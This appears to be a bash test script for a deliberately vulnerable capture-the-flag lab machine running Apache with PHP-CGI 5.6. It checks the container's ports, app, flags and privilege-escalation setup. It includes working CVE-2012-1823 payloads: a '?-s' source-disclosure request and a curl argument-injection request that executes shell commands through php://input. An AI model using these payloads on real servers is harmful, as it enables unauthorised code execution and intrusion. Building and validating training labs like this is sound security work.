#!/bin/bash
# Machine 06: PHPocalypse — CVE-2012-1823 Test
# Tests: Apache+PHP-CGI on 80, ?-s source leak, argument injection RCE, cron privesc
source "$(dirname "$0")/_lib.sh"

BASE_DIR=${1:-$(dirname "$(dirname "$0")")}
CLEANUP=${2:-true}
MACHINE_DIR="$BASE_DIR/06-phpocalypse"
COMPOSE="$MACHINE_DIR/docker-compose.yml"
CONTAINER="lm-06-phpocalypse"
IP="10.10.6.10"

trap '[ "$CLEANUP" = true ] && stop_machine "$COMPOSE"' EXIT

section "Build & Start"
start_machine "$COMPOSE" "$CONTAINER" 120 || finish

section "Network Checks"
check_port "$IP" 80 "Apache HTTP"
check_port "$IP" 22 "SSH"

section "PHP App Checks"
check_http "http://${IP}/" 200 "PHP index page"
check_http_contains "http://${IP}/" "Inventory System" "App content present"
check_http_contains "http://${IP}/" "PHP" "PHP version visible"

section "PHP-CGI Binary"
check_exec "$CONTAINER" "ls -la /usr/lib/cgi-bin/php-cgi" "php-cgi" "php-cgi binary at /usr/lib/cgi-bin/"
check_exec "$CONTAINER" "/usr/lib/cgi-bin/php-cgi --version" "PHP 5.6" "PHP 5.6 CGI binary"

section "CVE-2012-1823: Source Disclosure"
# ?-s flag causes php-cgi to return highlighted PHP source
src_body=$(curl -sk --max-time 5 "http://${IP}/index.php?-s" 2>/dev/null)
if echo "$src_body" | grep -qE "(<\?php|&lt;\?php|span)"; then
  pass "PHP source code leaked via ?-s (CVE-2012-1823 source disclosure)"
else
  fail "?-s source disclosure failed — check php-cgi Action config"
  info "Response snippet: $(echo "$src_body" | head -5)"
fi

section "CVE-2012-1823: RCE via Argument Injection"
rce_out=$(curl -sk --max-time 10 \
  "http://${IP}/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input" \
  --data '<?php echo "PHPOCALYPSE_RCE=".shell_exec("id"); ?>' \
  -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)

if echo "$rce_out" | grep -q "PHPOCALYPSE_RCE="; then
  pass "PHP-CGI argument injection RCE CONFIRMED"
  info "RCE output: $(echo "$rce_out" | grep PHPOCALYPSE_RCE | head -1)"
else
  fail "Argument injection RCE NOT triggered"
  info "Response: $(echo "$rce_out" | head -5)"
fi

section "Flags"
check_exec "$CONTAINER" "cat /root/root.txt" "FLAG{" "Root flag"
check_exec "$CONTAINER" "cat /home/user/user.txt" "FLAG{" "User flag"

section "Cron Privesc Setup"
check_exec "$CONTAINER" "ls -la /opt/scripts/backup.sh" "rwxrwxrwx" "backup.sh is world-writable"
check_exec "$CONTAINER" "grep backup /etc/crontab" "backup.sh" "Cron entry exists for backup.sh"

section "SUID Privesc"
check_exec "$CONTAINER" "ls -la /usr/local/bin/vuln-reader" "rws" "SUID bit set on vuln-reader"
check_exec "$CONTAINER" "/usr/local/bin/vuln-reader /root/root.txt" "FLAG{" "SUID reads root flag"

finish
